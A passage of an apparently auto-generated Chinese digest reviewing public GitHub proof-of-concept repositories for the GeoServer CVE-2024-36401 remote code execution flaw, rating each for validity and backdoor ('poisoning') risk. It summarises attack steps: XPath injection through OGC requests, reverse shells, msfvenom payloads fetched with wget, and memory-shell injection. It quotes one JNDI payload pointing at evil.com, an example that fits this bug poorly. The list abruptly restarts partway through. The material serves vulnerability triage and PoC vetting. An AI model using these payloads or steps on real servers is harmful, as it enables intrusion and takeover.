总的来说，由于POC的目的是快速验证漏洞，相对比较简单，因此投毒的可能性相对较低，但仍然需要警惕。

**利用方式：**
该漏洞的利用方式主要通过以下步骤：

1.  **构建恶意OGC请求：** 攻击者构造包含恶意XPath表达式的OGC请求，例如WFS GetFeature请求。
2.  **发送恶意请求：** 攻击者将构造的恶意请求发送到目标GeoServer实例。
3.  **执行任意代码：** GeoServer在处理请求时，会将恶意XPath表达式传递给commons-jxpath库进行评估，从而导致任意代码执行。
4.  **反向Shell (POC使用):** POC 尝试建立反向 shell 连接，允许攻击者远程控制受感染的服务器。POC 发送一个POST请求，在请求中使用的payload来执行反向shell，连接到攻击者的机器。

**项目地址:** [bigb0x/CVE-2024-36401](https://github.com/bigb0x/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #11

**来源**: [CVE-2024-36401-bmth666_GeoServer-Tools-CVE-2024-36401.md](../2024/CVE-2024-36401-bmth666_GeoServer-Tools-CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 and < 2.23.6, >= 2.24.0 and < 2.24.4, >= 2.25.0 and < 2.25.2

**利用条件:** 默认 GeoServer 安装，网络可访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称评估为 XPath 表达式，未经身份验证的用户可以通过构造特制的 OGC 请求参数来执行远程代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞利用已被证实有效，并且在野外已被利用。提供的漏洞利用代码（GeoServer-Tools）旨在简化利用过程，支持不同 JDK 版本的回显和内存马注入。

**投毒风险：**
查看了提供的POC代码，主要是一个GUI工具，利用了`woodpecker-requests`进行网络请求，`flatlaf`做界面美化。主要功能是发送payload到目标服务器，根据描述可以支持内存马注入，回显等功能。经过分析，该工具本身存在投毒的可能性较低。但考虑到代码审查的局限性，仍存在一定的风险，因此评估投毒风险为10%。这些风险可能包括：
  *   **非必要依赖：** 引入了不必要的依赖库，这些库可能包含未知的安全漏洞或被恶意利用。
  *   **后门代码：** 在工具中隐藏了后门代码，例如在内存马功能中，注入恶意代码。

**利用方式：**
1.  攻击者通过构造恶意的 OGC 请求（例如，WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute 请求）来触发漏洞。
2.  恶意请求包含特制的 XPath 表达式，这些表达式在评估属性名称时被 GeoServer 不安全地执行。
3.  通过执行恶意 XPath 表达式，攻击者可以在 GeoServer 服务器上执行任意代码。
4.  漏洞利用代码（GeoServer-Tools）提供了一个图形界面，允许攻击者指定目标 GeoServer 实例的 URL，选择不同的攻击载荷（如 DNSLog、命令回显、内存马注入），并发送恶意请求。

**总结：**
CVE-2024-36401 是一个严重的安全漏洞，允许未经身份验证的攻击者在 GeoServer 上执行任意代码。提供的漏洞利用代码简化了利用过程，但需要谨慎使用，并注意潜在的投毒风险。

**项目地址:** [bmth666/GeoServer-Tools-CVE-2024-36401](https://github.com/bmth666/GeoServer-Tools-CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #12

**来源**: [CVE-2024-36401-cochaviz_cve-2024-36401-poc.md](../2024/CVE-2024-36401-cochaviz_cve-2024-36401-poc.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** GeoServer服务可公开访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中一个严重级别的远程代码执行漏洞。该漏洞源于 GeoServer 调用的 GeoTools 库 API 在处理要素类型的属性名时，以不安全的方式将其传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。虽然最初设计仅用于复杂要素类型，但被错误地应用于简单要素类型，使得所有 GeoServer 实例都受影响。

**有效性：** 根据漏洞库信息、搜索引擎结果和 Mr-xn 提供的漏洞利用代码存储库的存在，确认该漏洞的POC是有效的, 且已被积极利用。

**投毒风险：** 提供的XML代码片段主要包含WMS Capabilities的信息，例如服务名称、标题、摘要、关键字、在线资源、联系方式、费用、访问限制、最大宽度和高度等。它还定义了各种请求类型（GetCapabilities、GetMap、GetFeatureInfo、GetStyles）及其格式和DCPType。XML似乎是合法的WMS capabilities文件，可能用于与GeoServer交互，但缺少触发RCE所需的恶意XPath表达式。因此，直接从提供的XML片段评估，投毒风险较低，约为10%，因为实际利用需要结合特定参数构造恶意请求。例如：攻击者可能使用 `${jndi:ldap://evil.com/evil}`这样的JNDI注入表达式。

**利用方式：**

1.  **攻击入口：** 攻击者可以通过构造特制的OGC（Open Geospatial Consortium）请求，如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute。
2.  **漏洞触发：** 这些请求中的特定参数（通常是属性名或属性表达式）会被 GeoServer 以不安全的方式传递给 commons-jxpath 库进行 XPath 评估。
3.  **代码执行：** 攻击者在参数中插入恶意 XPath 表达式，例如使用 `Runtime.getRuntime().exec()` 或通过 JNDI 注入等方式来执行任意代码。
4.  **影响：** 成功利用该漏洞可导致完全控制受影响的 GeoServer 系统。

**项目地址:** [cochaviz/cve-2024-36401-poc](https://github.com/cochaviz/cve-2024-36401-poc)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #13

**来源**: [CVE-2024-36401-daniellowrie_CVE-2024-36401-PoC.md](../2024/CVE-2024-36401-daniellowrie_CVE-2024-36401-PoC.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (< 2.22.6), 2.23.x (>= 2.23.0, < 2.23.6), 2.24.x (>= 2.24.0, < 2.24.4), 2.25.x (>= 2.25.0, < 2.25.2)

**利用条件:** 默认 GeoServer 安装，允许网络访问，且目标版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞。该漏洞源于 GeoTools 库在处理要素类型属性名称时，不安全地将其传递给 commons-jxpath 库，从而允许攻击者通过构造恶意的 XPath 表达式来执行任意代码。利用方式是通过构造恶意的 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求，在请求的参数中注入恶意代码。提供的 PoC 代码 `geopwn.py` 演示了如何通过 WFS GetPropertyValue 请求，利用`exec`函数执行系统命令。

**有效性：**  提供的PoC代码看起来有效。它利用了WFS服务的GetPropertyValue请求，并构造包含恶意代码的`valueReference`参数，利用`exec`函数执行命令。它首先生成一个反向shell的payload，然后通过wget下载到目标机器，赋予执行权限，并最终执行。

**投毒风险：**  PoC 代码本身主要功能是利用漏洞实现远程代码执行。但是，也存在一定的投毒风险：

*   **依赖下载：** PoC脚本会通过wget下载shell，脚本中使用的 URL (evilURL)  由用户提供，存在被替换为恶意文件的风险。
*   **msfvenom参数：**  PoC脚本直接调用msfvenom生成payload，如果攻击者修改msfvenom的参数，可以生成包含恶意功能的payload。

总体而言，由于大部分操作依赖用户提供的参数和配置，直接投毒的可能性较低，主要风险在于用户配置不当或使用恶意 payload。投毒风险评估为10%。

**利用方式：**

1.  **准备：** 使用 `msfvenom` 生成反向 shell payload，并在攻击者控制的服务器上启动 HTTP 服务以提供 payload 下载。
2.  **构造恶意请求：**  利用 WFS GetPropertyValue 请求，在 `valueReference` 参数中注入恶意代码，通过 `exec` 函数执行系统命令。
3.  **下载 Payload：** 使用 `wget` 命令从攻击者控制的服务器下载反向 shell payload。
4.  **执行 Payload：**  使用 `chmod +x` 命令赋予 payload 执行权限，然后执行 payload 以获得反向 shell。

**项目地址:** [daniellowrie/CVE-2024-36401-PoC](https://github.com/daniellowrie/CVE-2024-36401-PoC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #14

**来源**: [CVE-2024-36401-funnyDog896_CVE-2024-36401-WoodpeckerPlugin.md](../2024/CVE-2024-36401-funnyDog896_CVE-2024-36401-WoodpeckerPlugin.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未授权的攻击者可以通过构造恶意请求执行任意代码

**影响版本:** 受影响版本： < 2.22.6, >= 2.23.0 且 < 2.23.6, >= 2.24.0 且 < 2.24.4, >= 2.25.0 且 < 2.25.2

**利用条件:** 目标GeoServer实例对外开放且未应用补丁或缓解措施

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中存在的一个远程代码执行 (RCE) 漏洞，由于不安全地将属性名称评估为 XPath 表达式导致。攻击者可以利用此漏洞通过构造特制的OGC请求（如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute）在目标服务器上执行任意代码。

**有效性：**
根据漏洞信息、搜索引擎结果，特别是CISA的已知被利用漏洞列表，以及提供的利用代码（WoodpeckerPlugin），可以判断此漏洞POC**有效**并且已被积极利用。

**投毒风险：**
提供的 WoodpeckerPlugin 旨在简化漏洞利用过程，但也存在一定投毒风险。风险点在于：
1.  **自定义内存马注入：** 虽然插件提供了默认的冰蝎内存马，但允许用户自定义内存马，如果用户不熟悉内存马，可能引入恶意代码。
2.  **Woodpecker 框架：** 该插件依赖于 Woodpecker 框架，若框架本身存在安全问题，则会影响所有插件。
3.  **源码审查不足：** 用户可能直接使用编译好的插件，而未进行充分的源码审查，增加了潜在的风险。虽然作者声明免责，但是下载来路不明的jar包，本身就存在风险。
4.  **命令执行的安全性：** 通过`command`参数执行任意命令，本身权限过大，存在风险。命令日志记录是否完善，也会影响溯源。
综合评估，投毒风险大约为10%，风险较低，主要集中在用户自定义操作上。

**利用方式：**
1.  **探测：** 使用插件的 Poc 模块进行批量探测，判断目标是否存在 CVE-2024-36401 漏洞。
2.  **命令执行：** 通过 Exploit 模块，设置 `command` 参数执行任意命令。
3.  **内存马注入：** 使用默认或自定义的内存马，注入到 GeoServer 进程中，实现更持久的控制。

**缓解措施：**
1.  升级 GeoServer 到已修复的版本 (>= 2.22.6, >= 2.23.6, >= 2.24.4, >= 2.25.2)。
2.  移除 `gt-complex-x.y.jar` 文件（可能影响部分功能）。
3.  使用防火墙或其他安全设备限制对 GeoServer 的访问。
4.  加强对GeoServer日志的监控，及时发现异常行为。

**项目地址:** [funnyDog896/CVE-2024-36401-WoodpeckerPlugin](https://github.com/funnyDog896/CVE-2024-36401-WoodpeckerPlugin)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #15

**来源**: [CVE-2024-36401-jakabakos_CVE-2024-36401-GeoServer-RCE.md](../2024/CVE-2024-36401-jakabakos_CVE-2024-36401-GeoServer-RCE.md)

# CVE-2024-36401

> 📦 该CVE有 **23** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-36401-0x0d3ad_CVE-2024-36401.md](../2024/CVE-2024-36401-0x0d3ad_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0, < 2.23.6, >= 2.24.0, < 2.24.4, >= 2.25.0, < 2.25.2

**利用条件:** 需要能够访问GeoServer服务的网络连接，默认安装环境

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，由于不安全地将属性名称评估为 XPath 表达式而导致。攻击者可以通过构造特制的 OGC 请求（例如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo 和 WPS Execute）来利用此漏洞，从而在服务器上执行任意代码。提供的 POC 代码首先通过 GET 请求 `/geoserver/wfs?request=ListStoredQueries&service=wfs&version=2.0.0` 获取 `ReturnFeatureType`，然后构造一个包含恶意 XPath 表达式的 POST 请求，发送到 `/geoserver/wfs`，表达式中利用 `java.lang.Runtime.getRuntime()` 执行 base64 编码的反弹 shell 命令。POC中的投毒风险较低，主要体现在脚本中可能包含潜在的恶意代码，或者利用社会工程学诱导用户执行恶意操作。例如，如果脚本被修改为下载和执行额外的恶意负载，或者收集用户的敏感信息，就会造成更大的安全威胁。 此处的"poison"指的是，如果攻击者上传包含后门代码的图层定义，然后诱导其他用户下载并使用该定义，则可能构成投毒攻击。

**项目地址:** [0x0d3ad/CVE-2024-36401](https://github.com/0x0d3ad/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #2

**来源**: [CVE-2024-36401-Chocapikk_CVE-2024-36401.md](../2024/CVE-2024-36401-Chocapikk_CVE-2024-36401.md)

## CVE-2024-36401 - GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** 目标GeoServer实例运行在受影响的版本上，且允许网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞。该漏洞源于 GeoTools 库 API 不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库进行评估，从而允许未经身份验证的用户通过特制的OGC请求执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果（多个安全厂商已确认该漏洞被利用）和提供的漏洞利用代码，可以判定此漏洞是有效的，并且已经被积极利用。

**投毒风险：**
漏洞利用代码 `exploit.py` 主要是实现漏洞利用的功能，从代码结构和功能来看，投毒风险较低。主要功能是发送恶意请求，监听反弹shell。代码中也定义了一些参数，比如远程IP、远程端口、代理等等。代码比较清晰，逻辑简单。但是依然不能排除作者在某些不明显的代码中加入恶意代码的可能性，特别是代码涉及到网络请求和系统命令执行。因此，评估投毒风险为 10%。

**利用方式：**
1.  **漏洞触发：** 攻击者通过构造恶意的OGC请求（例如 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求），其中包含特制的XPath表达式。这些请求会被GeoServer处理，并将属性名称传递给 commons-jxpath 库。
2.  **代码执行：** commons-jxpath 库在评估这些XPath表达式时，会执行攻击者注入的恶意代码。
3.  **反弹 Shell (POC中方式)：** 漏洞利用代码会启动一个监听器，然后在目标系统上执行命令以反弹 shell 到攻击者的机器上。  `exploit.py` 脚本允许攻击者指定目标 URL、攻击者 IP 地址和端口。通过命令行参数 `--url`, `--remote-ip`, 和 `--remote-port` 设置。
4.  **批量扫描:** 漏洞利用代码还支持批量扫描，通过 `--check <file_with_urls>` 指定包含URL列表的文件， `--threads <number_of_threads>`  指定线程数， `--output <output_file>` 指定输出文件。

**项目地址:** [Chocapikk/CVE-2024-36401](https://github.com/Chocapikk/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #3

**来源**: [CVE-2024-36401-Mr-xn_CVE-2024-36401.md](../2024/CVE-2024-36401-Mr-xn_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的用户可以通过构造的OGC请求执行任意代码

**影响版本:** 2.22.0 < version < 2.22.6, 2.23.0 <= version < 2.23.6, 2.24.0 <= version < 2.24.4, 2.25.0 <= version < 2.25.2

**利用条件:** GeoServer服务可网络访问，并且目标版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞。该漏洞源于GeoTools库API以不安全的方式将属性/属性名称传递给commons-jxpath库，从而允许执行任意代码。攻击者可以通过构造恶意的OGC请求（例如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic和WPS Execute）来利用此漏洞，执行任意代码。

**有效性：**
提供的POC代码利用了`valueReference`参数执行任意命令，例如计算器程序。从漏洞描述和搜索引擎结果来看，POC是有效的，并且已被野外利用。

**投毒风险：**
查看提供的POC代码和LICENSE文件。LICENSE采用MIT许可，相对宽松。代码本身主要是提供了漏洞的利用方式，没有发现明显的恶意代码。README中包含绕过WAF的payload，以及各种请求方式（GetPropertyValue, GetFeature）的PoC。

*   LICENSE文件: MIT License, 比较通用，没有发现可疑之处
*   README文件：提供了漏洞的描述和多个PoC示例，没有直接执行恶意操作的代码。

综合来看，投毒风险较低，在10%左右。主要风险来自于对POC的滥用，而非POC本身包含恶意代码。

**利用方式：**
1.  确定目标GeoServer版本在受影响范围内。
2.  使用提供的PoC构造恶意OGC请求。
3.  利用`valueReference`参数或`PropertyName`，注入包含恶意代码的XPath表达式。
4.  发送构造的请求到目标GeoServer服务器。
5.  如果漏洞存在，服务器将执行注入的代码。

**项目地址:** [Mr-xn/CVE-2024-36401](https://github.com/Mr-xn/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #4

**来源**: [CVE-2024-36401-Niuwoo_CVE-2024-36401.md](../2024/CVE-2024-36401-Niuwoo_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的攻击者可以通过精心构造的输入来执行任意代码。

**影响版本:** 受影响版本包括 2.22.6 之前的所有版本，以及 2.23.0 到 2.23.6，2.24.0 到 2.24.4，以及 2.25.0 到 2.25.2。

**利用条件:** 需要目标GeoServer实例存在于网络上并且可以访问 /geoserver/wfs 接口。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，源于 GeoTools 库 API 对属性名称的处理不当。攻击者可以通过向 GeoServer 的 WFS 接口发送特制的 OGC 请求，利用 XPath 表达式注入来执行任意代码。此漏洞影响默认 GeoServer 安装，无需身份验证。

**漏洞分析：**

根据漏洞库信息和搜索引擎结果，该漏洞允许未经身份验证的攻击者通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求执行任意代码。漏洞原因是 GeoServer 使用的 GeoTools 库不安全地将属性/属性名称传递给 commons-jxpath 库，从而允许执行任意 XPath 表达式。

**POC 代码分析：**

提供的 POC 代码是一个 Python 脚本，用于检测和利用 CVE-2024-36401 漏洞。该脚本包含以下功能：

*   `check_vuln(url)`: 发送一个包含恶意 payload 的 WFS GetPropertyValue 请求到目标 GeoServer 实例，如果返回状态码为 400 并且响应内容包含 'ClassCastException'，则认为目标存在漏洞。
*   `exploit_vuln(url, cmd)`:  发送一个包含恶意 payload 的 WFS GetPropertyValue 请求，其中 payload 包含要执行的命令。该函数通过 `java.lang.Runtime.getRuntime()` 来执行命令。同样，如果返回状态码为 400 并且响应内容包含 'ClassCastException'，则认为利用成功。
*   `multithreading(url_list, pools=5)`:  使用线程池对 URL 列表执行漏洞检测。
*   `init_config()`:  解析命令行参数，包括目标 URL、URL 列表和要执行的命令。

**有效性：**

POC 代码通过构造恶意的 WFS GetPropertyValue 请求，利用 XPath 表达式注入来执行任意代码。从漏洞库信息和搜索引擎结果来看，该漏洞已被广泛确认和利用，并且POC代码的逻辑正确，所以判断提供的 POC 代码有效。

**投毒风险：**

分析 POC 代码后，没有发现明显的恶意代码或后门。POC 代码的功能是发送包含恶意 payload 的 HTTP 请求，从而利用漏洞执行命令。脚本中的 `exec(java.lang.Runtime.getRuntime(),"...")` 部分是利用漏洞的关键，但它本身并不是恶意代码，而是漏洞利用的一部分。作者将执行命令的权限交给了使用者,是否需要投毒取决于使用者。

**利用方式：**

1.  使用 `check_vuln(url)` 函数检测目标 GeoServer 实例是否存在漏洞。
2.  如果目标存在漏洞，使用 `exploit_vuln(url, cmd)` 函数执行任意命令。命令通过命令行参数 `-c` 传递。
3.  可以使用 `-f` 参数指定一个包含多个 URL 的文件，并使用 `multithreading(url_list,10)` 函数进行批量检测。

总的来说，该 POC 代码是有效的，并且没有发现投毒风险。它允许攻击者远程执行任意代码，对 GeoServer 实例构成严重威胁。

**项目地址:** [Niuwoo/CVE-2024-36401](https://github.com/Niuwoo/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #5

**来源**: [CVE-2024-36401-RevoltSecurities_CVE-2024-36401.md](../2024/CVE-2024-36401-RevoltSecurities_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括 2.22.6 之前，2.23.0 到 2.23.6 之间，2.24.0 到 2.24.4 之间，以及 2.25.0 到 2.25.2 之间的版本

**利用条件:** 目标GeoServer实例对外开放且运行于受影响的版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行(RCE)漏洞，源于GeoTools库API不安全地将属性名作为XPath表达式传递给commons-jxpath库。未经身份验证的攻击者可以通过构造恶意的OGC请求参数（如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute requests）来利用此漏洞，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞已被积极利用。提供的POC代码仓库 `RevoltSecurities/CVE-2024-36401` 提供了一个用于检测和利用此漏洞的工具，包含docker-compose 文件用于搭建测试环境，以及 `exploit.py` 脚本用于漏洞利用，因此POC代码有效。

**投毒风险：**
*   `exploit.py` 文件中，脚本尝试与`https://api.cvssadvisor.com/ssrf/` 建立连接。这是一个潜在的风险点，因为攻击者可能通过控制该API来收集目标信息或进行其他恶意活动。但目前只是get请求实例信息，危害较小。但从代码的整体结构来看，投毒的风险较低。主要的功能还是针对`CVE-2024-36401`的利用。综上，认为投毒风险较低，约为10%。

**利用方式：**
1.  **确定目标GeoServer版本：** 确认目标GeoServer实例是否在受影响的版本范围内。
2.  **发送恶意OGC请求：** 构造包含恶意XPath表达式的OGC请求，例如WFS GetFeature请求。请求的Payload包含恶意的XPath表达式注入。
3.  **远程代码执行：** GeoServer在处理请求时，会将恶意XPath表达式传递给commons-jxpath库，导致执行任意代码。
4.  **利用工具：** 使用提供的`exploit.py`脚本，指定目标URL，通过发送恶意请求触发漏洞。

简而言之，攻击者通过发送特制的OGC请求，利用GeoServer对属性名表达式的不安全评估，实现远程代码执行。

**项目地址:** [RevoltSecurities/CVE-2024-36401](https://github.com/RevoltSecurities/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #6

**来源**: [CVE-2024-36401-URJACK2025_CVE-2024-36401.md](../2024/CVE-2024-36401-URJACK2025_CVE-2024-36401.md)

## CVE-2024-36401 GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.6之前, 2.23.0 < 2.23.6, 2.24.0 < 2.24.4, 2.25.0 < 2.25.2

**利用条件:** GeoServer实例暴露在网络上，且运行在受影响版本范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，该漏洞源于GeoTools库在处理属性名称时，不安全地将其传递给commons-jxpath库进行XPath表达式的评估。由于此XPath评估被错误地应用于简单要素类型，因此影响了所有GeoServer实例。攻击者可以通过构造恶意的WFS、WMS或WPS请求，在未经身份验证的情况下，利用`valueReference`注入Java代码来执行任意系统命令。

**有效性：** 提供的PoC代码 `exp.py` 利用了此漏洞。它通过构造包含恶意代码的XML Payload，并将其发送到GeoServer的WFS接口 `/geoserver/wfs`，从而实现远程命令执行。PoC提供了两种利用模式：`cmd` 模式用于执行单条命令，`reverse` 模式用于建立反弹Shell连接。

**投毒风险：**  该PoC存在一定的投毒风险，虽然主要功能是利用漏洞，但攻击者可以利用PoC的灵活性嵌入恶意代码，例如下载并执行额外的恶意软件。反弹shell的bash命令和http请求等行为都有可能被恶意利用。风险预估为10%。

**利用方式：**
1.  **确定目标:**  确定运行着存在漏洞版本的GeoServer实例，并确认其网络可访问性。
2.  **构造Payload:** 使用PoC脚本 `exp.py`，选择 `cmd` 模式执行任意命令，或者选择 `reverse` 模式建立反弹Shell。
3.  **发送请求:**  PoC脚本会构造包含恶意Java代码的XML Payload，并通过POST请求发送到目标的WFS接口 `/geoserver/wfs`。
4.  **执行代码:**  如果漏洞存在，GeoServer会执行Payload中的恶意代码，从而实现远程命令执行。如果是反弹shell模式，需要在攻击者机器上监听指定端口，等待目标机器反弹shell连接。

**项目地址:** [URJACK2025/CVE-2024-36401](https://github.com/URJACK2025/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #7

**来源**: [CVE-2024-36401-XiaomingX_cve-2024-36401-poc.md](../2024/CVE-2024-36401-XiaomingX_cve-2024-36401-poc.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，可能导致服务器完全控制

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0 且 < 2.23.6, >= 2.24.0 且 < 2.24.4, >= 2.25.0 且 < 2.25.2

**利用条件:** 默认 GeoServer 安装，网络可访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称作为 XPath 表达式进行评估，导致未经身份验证的用户可以通过构造的 OGC 请求参数执行远程代码。漏洞利用方式是通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求等多种方式。漏洞利用代码仓库中只包含 LICENSE 文件，并未发现任何可疑的投毒代码。

**项目地址:** [XiaomingX/cve-2024-36401-poc](https://github.com/XiaomingX/cve-2024-36401-poc)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #8

**来源**: [CVE-2024-36401-ahisec_geoserver-.md](../2024/CVE-2024-36401-ahisec_geoserver-.md)

## CVE-2024-36401 - GeoServer RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (< 2.22.6), 2.23.x (>= 2.23.0, < 2.23.6), 2.24.x (>= 2.24.0, < 2.24.4), 2.25.x (>= 2.25.0, < 2.25.2)

**利用条件:** 默认 GeoServer 安装，允许通过 WFS/WMS/WPS 接口进行网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 允许未经身份验证的攻击者通过构造特制的OGC请求（例如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo 和 WPS Execute）来执行远程代码。漏洞根源在于 GeoServer 使用的 GeoTools 库不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，这使得攻击者可以在 XPath 表达式中注入恶意代码。提供的PoC代码展示了如何利用 `wfs:GetPropertyValue` 请求执行命令。它首先建议使用 `wfs:ListStoredQueries` 获取有效的 `wfs:ReturnFeatureType` 值，然后将其用于构建 `wfs:Query typeNames` 参数，以提高漏洞利用的准确性。示例payload包括了ping命令的执行和反弹shell的payload，以及内存马注入的payload。文章中提到的误判几率较高是因为直接使用 `sf:archsites` ，如果目标环境中不存在该feature type,则会报错。建议先获取可用的feature type名称。

**有效性：**
提供的PoC代码利用了漏洞描述中提到的攻击向量，并且参考了GitHub上的公开PoC（https://github.com/Mr-xn/CVE-2024-36401）。多个搜索结果表明该漏洞正在被积极利用（https://www.fortinet.com/blog/threat-research/threat-actors-exploit-geoserver-vulnerability-cve-2024-36401，https://www.sonicwall.com/blog/geoserver-rce-vulnerability-cve-2024-36401-being-exploited-in-the-wild），表明该漏洞的利用是有效的。

**投毒风险：**
在提供的PoC代码中，没有发现明显的投毒代码。代码主要提供了漏洞利用的思路和示例payload，包括执行ping命令、反弹shell和注入内存马。反弹shell和内存马需要用户提供恶意代码，因此不存在作者隐藏的后门代码。因此，投毒风险评估为0%。

**利用方式：**
1.  **确定目标 GeoServer 版本：** 确认目标 GeoServer 版本在受影响的范围内。
2.  **获取有效的Feature Type：** 使用 `wfs:ListStoredQueries` 请求获取有效的 `<wfs:ReturnFeatureType>`值。
